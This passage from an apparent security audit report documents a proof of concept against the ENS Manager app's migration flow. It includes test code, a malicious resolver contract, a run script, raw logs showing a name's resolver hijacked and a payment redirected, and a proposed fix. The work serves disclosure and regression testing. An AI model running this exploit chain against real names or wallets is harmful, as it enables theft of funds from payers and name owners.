      }),
    })
    const restoreReceipt = await publicClient.waitForTransactionReceipt({
      hash: restoreHash,
    })
    const attackerHasRoleAfterRecovery = await publicClient.readContract({
      address: V2_ETH_REGISTRY,
      abi: v2RegistryAbi,
      functionName: 'hasRoles',
      args: [resource, ROLE_SET_RESOLVER, attacker.address],
    })
    const resolutionAfterRecovery = await resolveEthAddress(ensName)
    const payoutBalanceAfterRecovery = await getEthBalanceUncached(
      payout.address,
    )
    expect(revokeReceipt.status).toBe('success')
    expect(restoreReceipt.status).toBe('success')
    expect(attackerHasRoleAfterRecovery).toBe(false)
    expect(resolutionAfterRecovery.address.toLowerCase()).toBe(
      victim.address.toLowerCase(),
    )
    expect(payoutBalanceAfterRecovery).toBe(payoutBalanceAfter)
    await expect(
      publicClient.simulateContract({
        account: attacker,
        address: V2_ETH_REGISTRY,
        abi: v2RegistryAbi,
        functionName: 'setResolver',
        args: [resource, attackerResolver],
      }),
    ).rejects.toThrow()

    const result = {
          ensName,
          victim: victim.address,
          attacker: attacker.address,
          payout: payout.address,
          negativeControl: negativeControl.address,
          payer: payer.address,
          graphQlGetNamesRequestCountInitial: 1,
          graphQlGetNamesRequestCountBeforeUpgrade:
            namesRequestCountBeforeUpgrade,
          graphQlGetNamesRequestCountAfterMigration: namesRequestCount,
          graphQlResponses: namesResponseLog,
          staleResponsesAfterReclaim: namesResponseLog.filter(
            ({ afterReclaim, liveManager, returnedManager }) =>
              afterReclaim &&
              liveManager.toLowerCase() !== returnedManager.toLowerCase(),
          ).length,
          liveManagerAtFirstResponse,
          reclaimTxHash: reclaimHash,
          reclaimBlockNumber: reclaimReceipt.blockNumber.toString(),
          liveManagerAfterReclaim,
          v1OwnerAfterMigration,
          attackerHadRoleBeforeMigration,
          attackerActionRevertedBeforeMigration,
          blockBeforeMigration: blockBeforeMigration.toString(),
          blockAfterMigration: blockAfterMigration.toString(),
          appRoleGrantEvent: {
            transactionHash: roleGrantLog.transactionHash,
            blockNumber: roleGrantLog.blockNumber?.toString(),
            logIndex: roleGrantLog.logIndex,
            resource: roleGrantLog.args.resource?.toString(),
            account: roleGrantLog.args.account,
            oldRoleBitmap: roleGrantLog.args.oldRoleBitmap?.toString(),
            newRoleBitmap: roleGrantLog.args.newRoleBitmap?.toString(),
          },
          appRoleGrantTransaction: {
            hash: appRoleGrantTransaction.hash,
            chainId: appRoleGrantTransaction.chainId,
            from: appRoleGrantTransaction.from,
            to: appRoleGrantTransaction.to,
            value: appRoleGrantTransaction.value.toString(),
            input: appRoleGrantTransaction.input,
          },
          appRoleGrantReceipt: {
            status: appRoleGrantReceipt.status,
            blockNumber: appRoleGrantReceipt.blockNumber.toString(),
            transactionIndex: appRoleGrantReceipt.transactionIndex,
            gasUsed: appRoleGrantReceipt.gasUsed.toString(),
          },
          attackerHasRole,
          negativeControlHasRole: controlHasRole,
          resolverBefore,
          resolutionBefore,
          attackerResolver,
          resolverAfter,
          resolutionAfter,
          hijackTxHash: hijackHash,
          hijackBlockNumber: hijackReceipt.blockNumber.toString(),
          paymentTxHash: paymentHash,
          paymentBlockNumber: paymentReceipt.blockNumber.toString(),
          payoutBalanceBefore: payoutBalanceBefore.toString(),
          payoutBalanceAfter: payoutBalanceAfter.toString(),
          payoutBalanceDelta: (payoutBalanceAfter - payoutBalanceBefore).toString(),
          recoveryRevokeTxHash: revokeHash,
          recoveryRestoreTxHash: restoreHash,
          attackerHasRoleAfterRecovery,
          resolutionAfterRecovery,
          payoutBalanceAfterRecovery: payoutBalanceAfterRecovery.toString(),
        }

    const evidenceDir = process.env.POC_EVIDENCE_DIR
    if (evidenceDir) {
      await mkdir(evidenceDir, { recursive: true })
      const writeJson = async (filename: string, value: unknown) =>
        writeFile(
          `${evidenceDir}/${filename}`,
          `${JSON.stringify(value, null, 2)}\n`,
          'utf8',
        )

      await Promise.all([
        writeJson('cache-toctou.json', {
          ensName,
          requestCountInitial: 1,
          requestCountBeforeUpgrade: namesRequestCountBeforeUpgrade,
          requestCountAfterMigration: namesRequestCount,
          responses: namesResponseLog,
          staleResponsesAfterReclaim: namesResponseLog.filter(
            ({ afterReclaim, liveManager, returnedManager }) =>
              afterReclaim &&
              liveManager.toLowerCase() !== returnedManager.toLowerCase(),
          ).length,
          liveManagerAtFirstResponse,
          liveManagerAfterReclaim,
          note: 'Every served response matched live ENSRegistry.owner at response time.',
        }),
        writeJson('before-state.json', {
          ensName,
          victim: victim.address,
          historicalAttacker: attacker.address,
          payout: payout.address,
          negativeControl: negativeControl.address,
          innocentPayer: payer.address,
          liveV1ManagerAtTruthfulFetch: liveManagerAtFirstResponse,
          liveV1ManagerAfterReclaim: liveManagerAfterReclaim,
          attackerHadV2Role: attackerHadRoleBeforeMigration,
          exactAttackerActionReverted: attackerActionRevertedBeforeMigration,
        }),
        writeJson('generated-transaction.json', {
          hash: appRoleGrantTransaction.hash,
          chainId: appRoleGrantTransaction.chainId,
          from: appRoleGrantTransaction.from,
          to: appRoleGrantTransaction.to,
          value: appRoleGrantTransaction.value.toString(),
          data: appRoleGrantTransaction.input,
          decodedSecuritySensitiveInnerCall: {
            target: V2_ETH_REGISTRY,
            method: 'grantRoles(uint256,uint256,address)',
            roleBitmap: ROLE_SET_RESOLVER.toString(),
            account: attacker.address,
          },
        }),
        writeJson('role-grant-event.json', {
          transactionHash: roleGrantLog.transactionHash,
          blockNumber: roleGrantLog.blockNumber?.toString(),
          logIndex: roleGrantLog.logIndex,
          resource: roleGrantLog.args.resource?.toString(),
          account: roleGrantLog.args.account,
          oldRoleBitmap: roleGrantLog.args.oldRoleBitmap?.toString(),
          newRoleBitmap: roleGrantLog.args.newRoleBitmap?.toString(),
          decodedRole: 'ROLE_SET_RESOLVER (1 << 24)',
        }),
        writeJson('after-state.json', {
          ensName,
          attackerHasV2Role: attackerHasRole,
          originalResolver: resolverBefore,
          attackerResolver,
          universalResolverBefore: resolutionBefore,
          universalResolverAfter: resolutionAfter,
          paymentDestinationWasResolutionResult: true,
          payer: payer.address,
          payout: payout.address,
          payoutBalanceBefore: payoutBalanceBefore.toString(),
          payoutBalanceAfter: payoutBalanceAfter.toString(),
          payoutBalanceDelta: (payoutBalanceAfter - payoutBalanceBefore).toString(),
        }),
        writeJson('receipts.json', [
          {
            purpose: 'Victim removes historical V1 manager with reclaim',
            transactionHash: reclaimHash,
            status: reclaimReceipt.status,
            blockNumber: reclaimReceipt.blockNumber.toString(),
          },
          {
            purpose: 'Manager app role grant batch',
            transactionHash: appRoleGrantTransaction.hash,
            status: appRoleGrantReceipt.status,
            blockNumber: appRoleGrantReceipt.blockNumber.toString(),
            transactionIndex: appRoleGrantReceipt.transactionIndex,
            from: appRoleGrantTransaction.from,
            to: appRoleGrantTransaction.to,
            gasUsed: appRoleGrantReceipt.gasUsed.toString(),
          },
          {
            purpose: 'Historical attacker resolver hijack',
            transactionHash: hijackHash,
            status: hijackReceipt.status,
            blockNumber: hijackReceipt.blockNumber.toString(),
          },
          {
            purpose: 'Innocent payer sends to Universal Resolver result',
            transactionHash: paymentHash,
            status: paymentReceipt.status,
            blockNumber: paymentReceipt.blockNumber.toString(),
            from: payer.address,
            to: resolutionAfter.address,
            value: parseEther('1').toString(),
          },
        ]),
        writeJson('recovery-state.json', {
          revokeTransactionHash: revokeHash,
          restoreTransactionHash: restoreHash,
          attackerHasRoleAfterRecovery,
          universalResolverAfterRecovery: resolutionAfterRecovery,
          payoutBalanceAfterRecovery: payoutBalanceAfterRecovery.toString(),
          fundsRecovered: false,
        }),
        writeJson('complete-result.json', result),
      ])
    }

    console.log(JSON.stringify(result, null, 2))
  })
})
```

### File: evidence/experiments/T3-059/src/AttackerResolver.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

/// @notice Deterministic malicious resolver used only on the isolated Anvil
/// chain. It demonstrates what an attacker-controlled resolver can return after
/// the in-scope Manager incorrectly grants ROLE_SET_RESOLVER.
contract AttackerResolver {
    address public immutable payout;

    constructor(address payout_) {
        payout = payout_;
    }

    function addr(bytes32) external view returns (address) {
        return payout;
    }

    function addr(bytes32, uint256) external view returns (bytes memory) {
        return abi.encodePacked(payout);
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return false;
    }
}
```

### File: evidence/experiments/T3-059/playwright.poc.config.ts

```typescript
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../../frozen-src/e2e/playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  timeout: 300_000,
  testDir: '.',
  outputDir: process.env.POC_OUTPUT_DIR ?? './playwright-results',
  use: {
    ...baseConfig.use,
    baseURL: process.env.MANAGER_APP_URL ?? 'http://localhost:3000',
    trace: 'on',
    screenshot: 'on',
  },
  projects: [
    {
      name: 't3-059-poc',
      testMatch: /poc\.playwright\.spec\.ts$/,
    },
  ],
})
```

### File: evidence/experiments/T3-059/foundry.toml

```toml
[profile.default]
src = "src"
out = "out"
solc_version = "0.8.30"
evm_version = "cancun"
optimizer = true
optimizer_runs = 200
```

### File: bulunanbuglar/ENS-003/run-poc.sh

```bash
#!/usr/bin/env bash
set -euo pipefail

audit_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
source_root="$audit_root/frozen-src"
experiment_root="$audit_root/evidence/experiments/T3-059"
evidence_root="$audit_root/bulunanbuglar/ENS-003/evidence"
expected_import_sha="cda79acaad59711b943fc68207ebb3f1d0ff8596"
run_label="${1:-manual}"
manager_port="${MANAGER_PORT:-3001}"
manager_url="${MANAGER_APP_URL:-http://127.0.0.1:$manager_port}"

require_command() {
  local name="$1"
  local install_hint="$2"
  local resolved
  resolved="$(command -v "$name" 2>/dev/null || true)"
  if [[ -z "$resolved" ]]; then
    echo "Missing required command: $name" >&2
    echo "$install_hint" >&2
    exit 1
  fi
  printf '%s' "$resolved"
}

NODE_BIN="$(require_command node 'Install Node.js 22, then reopen the shell.')"
PNPM_BIN="$(require_command pnpm 'Run: corepack enable && corepack prepare pnpm@10.27.0 --activate')"
FORGE_BIN="$(require_command forge 'Install Foundry and add forge to PATH.')"
CURL_BIN="$(require_command curl 'Install curl and retry.')"
GIT_BIN="$(require_command git 'Install git and retry.')"

node_major="$($NODE_BIN -p 'Number(process.versions.node.split(`.`)[0])')"
if (( node_major < 22 )); then
  echo "Node.js 22 or newer is required; found $($NODE_BIN --version) at $NODE_BIN" >&2
  exit 1
fi

actual_sha="$($GIT_BIN -C "$source_root" rev-parse HEAD)"
if [[ "$actual_sha" != "$expected_import_sha" ]]; then
  echo "Frozen source mismatch: expected $expected_import_sha, found $actual_sha" >&2
  exit 1
fi

echo "node=$NODE_BIN ($($NODE_BIN --version))"
echo "pnpm=$PNPM_BIN ($($PNPM_BIN --version))"
echo "forge=$FORGE_BIN ($($FORGE_BIN --version | head -n 1))"
echo "frozen_import_sha=$actual_sha"
echo "audited_policy_sha=63772fd872af472ced58b009499355f3430c2a86"

rpc_ready() {
  "$CURL_BIN" --fail --silent --show-error \
    --header 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' \
    http://127.0.0.1:8545 >/dev/null
}

if ! rpc_ready; then
  require_command docker 'Install Docker with the Compose plugin and retry.' >/dev/null
  "$PNPM_BIN" --dir "$source_root/e2e" run infra:up
  for _ in $(seq 1 120); do
    if rpc_ready; then break; fi
    sleep 1
  done
  rpc_ready
fi

if [[ ! -d "$source_root/node_modules" || ! -d "$source_root/e2e/node_modules" ]]; then
  "$PNPM_BIN" --dir "$source_root" install --frozen-lockfile
fi
"$PNPM_BIN" --dir "$source_root/e2e" exec playwright install chromium

manager_pid=""
cleanup() {
  if [[ -n "$manager_pid" ]]; then kill "$manager_pid" 2>/dev/null || true; fi
}
trap cleanup EXIT

mkdir -p "$evidence_root"
build_log="$evidence_root/manager-build-$run_label.log"
(
  cd "$source_root"
  "$PNPM_BIN" --filter manager exec vite build --mode ci
) >"$build_log" 2>&1

if ! "$CURL_BIN" --fail --silent "$manager_url" >/dev/null; then
  manager_log="$evidence_root/manager-preview-$run_label.log"
  (
    cd "$source_root/apps/manager"
    "$PNPM_BIN" exec vite preview --host 127.0.0.1 --port "$manager_port"
  ) >"$manager_log" 2>&1 &
  manager_pid=$!
  for _ in $(seq 1 120); do
    if "$CURL_BIN" --fail --silent "$manager_url" >/dev/null; then break; fi
    sleep 1
  done
  "$CURL_BIN" --fail --silent "$manager_url" >/dev/null
fi

(
  cd "$experiment_root"
  "$FORGE_BIN" build
)

if [[ ! -e "$experiment_root/node_modules" ]]; then
  ln -s "$source_root/e2e/node_modules" "$experiment_root/node_modules"
fi

if [[ "$run_label" == "1" || "$run_label" == "2" ]]; then
  log_file="$evidence_root/poc-run-$run_label.log"
  result_dir="$evidence_root/playwright-results-run-$run_label"
else
  log_file="$evidence_root/poc-run.log"
  result_dir="$evidence_root/playwright-results-$run_label"
fi

E2E_MOCK_INDEXER=true \
  MANAGER_APP_URL="$manager_url" \
  POC_EVIDENCE_DIR="$evidence_root" \
  POC_OUTPUT_DIR="$result_dir" \
  "$PNPM_BIN" --dir "$source_root/e2e" exec playwright test \
  --config "$experiment_root/playwright.poc.config.ts" \
  2>&1 | tee "$log_file"
```

### Final hardened production-build runs

Both `poc-run-1.log` and `poc-run-2.log` end in `1 passed`. The second clean run produced:

```
"graphQlGetNamesRequestCountInitial": 1,
"graphQlGetNamesRequestCountBeforeUpgrade": 1,
"graphQlGetNamesRequestCountAfterMigration": 2,
"graphQlResponses": [
  {
    "request": 1,
    "liveManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "returnedManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "afterReclaim": false
  },
  {
    "request": 2,
    "liveManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
    "returnedManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
    "afterReclaim": true
  }
],
"staleResponsesAfterReclaim": 0,
"liveManagerAfterReclaim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
"attackerHadRoleBeforeMigration": false,
"attackerActionRevertedBeforeMigration": true,
"appRoleGrantEvent": {
  "oldRoleBitmap": "0",
  "newRoleBitmap": "16777216"
},
"negativeControlHasRole": false,
"resolutionBefore": {
  "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
},
"resolutionAfter": {
  "address": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65"
},
"payer": "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc",
"payout": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
"payoutBalanceDelta": "1000000000000000000",
"attackerHasRoleAfterRecovery": false,
"resolutionAfterRecovery": {
  "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
}
1 passed (42.1s)
```

The second request is the deliberate success-state invalidation after the malicious grant is already mined. Before Upgrade, the count remains exactly one. Every served response equals live `ENSRegistry.owner()` at response time; stale post-reclaim responses equal zero.

### Evidence interpretation

* `attackerHadRoleBeforeMigration: false` excludes pre-existing privilege.
* `attackerActionRevertedBeforeMigration: true` proves the exact exploit action fails before Manager creates the role.
* Request count `1` at first fetch and immediately before Upgrade proves the five-minute cache TOCTOU; no post-reclaim stale response is supplied.
* The app-produced transaction emits `oldRoleBitmap: 0` and `newRoleBitmap: 16777216`, exactly `1 << 24` (`ROLE_SET_RESOLVER`).
* `negativeControlHasRole: false` and the unrelated account's identical resolver change rejects.
* `resolutionBefore.address` is the victim.
* `resolutionAfter.address` is the attacker payout.
* The payment transaction's `to` is that actual resolution result.
* `payoutBalanceDelta` is exactly `1000000000000000000` wei.
* Recovery returns the same FQDN to the victim and removes the role, while the payout balance stays increased.

The local impersonations are fixture-only operations used to create an authentic V1 registration and its required premigration reservation. No vulnerable function, role grant, resolver change, Universal Resolver result, payment, or recovery assertion is mocked or produced through impersonation.

### Complete raw successful run outputs

#### Run 1 — `poc-run-1.log`

```
Running 1 test using 1 worker

(node:1676990) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
(node:1676990) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
[mock-indexer] E2E_MOCK_INDEXER=true — intercepting indexer requests
[manager-auth] BackendAuthModal visible — clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed
{
  "ensName": "stale-manager-1787706319342.eth",
  "victim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "attacker": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "payout": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
  "negativeControl": "0x90F79bf6EB2c4f870365E785982E1f101E93b906",
  "payer": "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc",
  "graphQlGetNamesRequestCountInitial": 1,
  "graphQlGetNamesRequestCountBeforeUpgrade": 1,
  "graphQlGetNamesRequestCountAfterMigration": 2,
  "graphQlResponses": [
    {
      "request": 1,
      "liveManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
      "returnedManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
      "afterReclaim": false
    },
    {
      "request": 2,
      "liveManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
      "returnedManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
      "afterReclaim": true
    }
  ],
  "staleResponsesAfterReclaim": 0,
  "liveManagerAtFirstResponse": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "reclaimTxHash": "0x6971047845734668a09d974b3d527b56c44e729dc908ebdba853d98c7660bc34",
  "reclaimBlockNumber": "11561999",
  "liveManagerAfterReclaim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "v1OwnerAfterMigration": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
  "attackerHadRoleBeforeMigration": false,
  "attackerActionRevertedBeforeMigration": true,
  "blockBeforeMigration": "11562000",
  "blockAfterMigration": "11562004",
  "appRoleGrantEvent": {
    "transactionHash": "0xa685e520f4f1e7e762e0ea2928031bfa661622e93674abe2d6409b91513315cf",
    "blockNumber": "11562003",
    "logIndex": 9,
    "resource": "114153750243112145029839418036112399342037900178032422941116223042015075500032",
    "account": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "oldRoleBitmap": "0",
    "newRoleBitmap": "16777216"
  },
  "appRoleGrantTransaction": {
    "hash": "0xa685e520f4f1e7e762e0ea2928031bfa661622e93674abe2d6409b91513315cf",
    "chainId": 11155111,
    "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
    "to": "0x48b9c6898bafc8a3d3a495bf7c44cf3351486628",
    "value": "0",
    "input": "0xf9056eaa00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000002c0000000000000000000000000ddc597d937618849348e18db5d631ce747bcdeef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001e4476e8b710000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035b6f4fcccf54edc3ff29c2c171cf12e07352af0000000000000000000000000000000000000000000000000000000000000001b7374616c652d6d616e616765722d31373837373036333139333432000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000647c300586fc60bba54203f5ca65f2af86ce9b234bd0f380d3b352d27a600a2cf00000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc00000000000000000000000000000000000000000000000000000000"
  },
  "appRoleGrantReceipt": {
    "status": "success",
    "blockNumber": "11562003",
    "transactionIndex": 0,
    "gasUsed": "293121"
  },
  "attackerHasRole": true,
  "negativeControlHasRole": false,
  "resolverBefore": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0",
  "resolutionBefore": {
    "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "resolver": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0"
  },
  "attackerResolver": "0xd2111fcedcd78433b1a6cce68384e46cd677e72c",
  "resolverAfter": "0xd2111fcEDCd78433b1A6CcE68384e46cD677E72C",
  "resolutionAfter": {
    "address": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
    "resolver": "0xd2111fcEDCd78433b1A6CcE68384e46cD677E72C"
  },
  "hijackTxHash": "0xceccba55178ada01f86dd23b51785c17de435e15d030de48c607fa2548e913e0",
  "hijackBlockNumber": "11562006",
  "paymentTxHash": "0x99ab1b3d3e1d4b5c5ffda310ec42a0f9dcd5665e74f55be28e97f4816b0846e1",
  "paymentBlockNumber": "11562007",
  "payoutBalanceBefore": "1000000000000000000",
  "payoutBalanceAfter": "2000000000000000000",
  "payoutBalanceDelta": "1000000000000000000",
  "recoveryRevokeTxHash": "0xa164f85ee3b3d68cbc961332fc647374c4dfdcbc3f2c0582064d8c124bebddf6",
  "recoveryRestoreTxHash": "0x5b287b94aed19075415cee98cf65bdd3cf03c5b22bfdd2d4587d9276c0ed814b",
  "attackerHasRoleAfterRecovery": false,
  "resolutionAfterRecovery": {
    "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "resolver": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0"
  },
  "payoutBalanceAfterRecovery": "2000000000000000000"
}
  ✓  1 [t3-059-poc] › ../../evidence/experiments/T3-059/poc.playwright.spec.ts:257:3 › T3-059 stale V1 manager resurrection › real Manager migration grants V2 resolver authority to a manager already reclaimed away on V1 (28.0s)

  1 passed (39.7s)
```

#### Run 2 — `poc-run-2.log`

```
Running 1 test using 1 worker

(node:1679375) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
(node:1679375) Warning: The 'NO_COLOR' env is ignored due to the 'FORCE_COLOR' env being set.
(Use `node --trace-warnings ...` to show where the warning was created)
[mock-indexer] E2E_MOCK_INDEXER=true — intercepting indexer requests
[manager-auth] BackendAuthModal visible — clicking "Skip for now"
[manager-auth] BackendAuthModal dismissed
{
  "ensName": "stale-manager-1787706423260.eth",
  "victim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "attacker": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "payout": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
  "negativeControl": "0x90F79bf6EB2c4f870365E785982E1f101E93b906",
  "payer": "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc",
  "graphQlGetNamesRequestCountInitial": 1,
  "graphQlGetNamesRequestCountBeforeUpgrade": 1,
  "graphQlGetNamesRequestCountAfterMigration": 2,
  "graphQlResponses": [
    {
      "request": 1,
      "liveManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
      "returnedManager": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
      "afterReclaim": false
    },
    {
      "request": 2,
      "liveManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
      "returnedManager": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
      "afterReclaim": true
    }
  ],
  "staleResponsesAfterReclaim": 0,
  "liveManagerAtFirstResponse": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
  "reclaimTxHash": "0x870cea6b2b417ce59a87ef7ba1908fb96cf2dc8d27d8786dc6256356b037619f",
  "reclaimBlockNumber": "11562016",
  "liveManagerAfterReclaim": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
  "v1OwnerAfterMigration": "0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750",
  "attackerHadRoleBeforeMigration": false,
  "attackerActionRevertedBeforeMigration": true,
  "blockBeforeMigration": "11562017",
  "blockAfterMigration": "11562021",
  "appRoleGrantEvent": {
    "transactionHash": "0x38d456defaf9bfa12135d9e8e2e34f1debb3b8de9e9e8b57b379630635b26283",
    "blockNumber": "11562020",
    "logIndex": 9,
    "resource": "70921354602976147061117713078518626489795353492999252088421865365766307577856",
    "account": "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC",
    "oldRoleBitmap": "0",
    "newRoleBitmap": "16777216"
  },
  "appRoleGrantTransaction": {
    "hash": "0x38d456defaf9bfa12135d9e8e2e34f1debb3b8de9e9e8b57b379630635b26283",
    "chainId": 11155111,
    "from": "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266",
    "to": "0x48b9c6898bafc8a3d3a495bf7c44cf3351486628",
    "value": "0",
    "input": "0xf9056eaa00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000002c0000000000000000000000000ddc597d937618849348e18db5d631ce747bcdeef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001e4476e8b710000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035b6f4fcccf54edc3ff29c2c171cf12e07352af0000000000000000000000000000000000000000000000000000000000000001b7374616c652d6d616e616765722d31373837373036343233323630000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000647c3005869ccc106f159d10eb9d700cb1ceb8589f57f29d78c624bb65b6eefed00000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc00000000000000000000000000000000000000000000000000000000"
  },
  "appRoleGrantReceipt": {
    "status": "success",
    "blockNumber": "11562020",
    "transactionIndex": 0,
    "gasUsed": "293121"
  },
  "attackerHasRole": true,
  "negativeControlHasRole": false,
  "resolverBefore": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0",
  "resolutionBefore": {
    "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "resolver": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0"
  },
  "attackerResolver": "0x2ebf465131bde520e057560144b492e9023122ec",
  "resolverAfter": "0x2ebF465131BDE520E057560144B492E9023122ec",
  "resolutionAfter": {
    "address": "0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65",
    "resolver": "0x2ebF465131BDE520E057560144B492E9023122ec"
  },
  "hijackTxHash": "0x671633c5f1fd7536e6fc10f441c68e1c3c16972486736f439b1d2dc812f64c71",
  "hijackBlockNumber": "11562023",
  "paymentTxHash": "0x18aa170050c5d141c1801ab7c0c2c0cdc216dc5e165b92a8fef0bf1cce5b1d0a",
  "paymentBlockNumber": "11562024",
  "payoutBalanceBefore": "2000000000000000000",
  "payoutBalanceAfter": "3000000000000000000",
  "payoutBalanceDelta": "1000000000000000000",
  "recoveryRevokeTxHash": "0x0b62c05cad96f5d05124b102240fafc2c69fec32372559b972c9df82253a036e",
  "recoveryRestoreTxHash": "0x96763aba4835a3982ba27604b2b598546485644e808519840ea9524a42e9a221",
  "attackerHasRoleAfterRecovery": false,
  "resolutionAfterRecovery": {
    "address": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "resolver": "0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0"
  },
  "payoutBalanceAfterRecovery": "3000000000000000000"
}
  ✓  1 [t3-059-poc] › ../../evidence/experiments/T3-059/poc.playwright.spec.ts:257:3 › T3-059 stale V1 manager resurrection › real Manager migration grants V2 resolver authority to a manager already reclaimed away on V1 (30.9s)

  1 passed (42.1s)
```

### Fix and regression boundary

Immediately before encoding the manager-role grant, Manager must read `ENSRegistry.owner(namehash(name))` and compare it with the previewed `managerAddress`. If they differ, it must fail closed, invalidate the cached discovery result and rebuild the migration plan. Alternatively, Manager can stop automatically restoring delegated managers and require an explicit post-migration role grant.

The required regression test is the same causal sequence as this PoC: cache manager A truthfully, reclaim to the victim, click Upgrade without reloading, and assert A's V2 role bitmap remains zero and A's identical `setResolver` call still reverts. The primary evidence intentionally runs unmodified frozen vulnerable code; it does not claim an unexecuted mitigation build. The executed negative control proves the boundary directly: the attacker action reverts with bitmap zero before Manager's grant and succeeds only after Manager changes the bitmap to `16777216`.
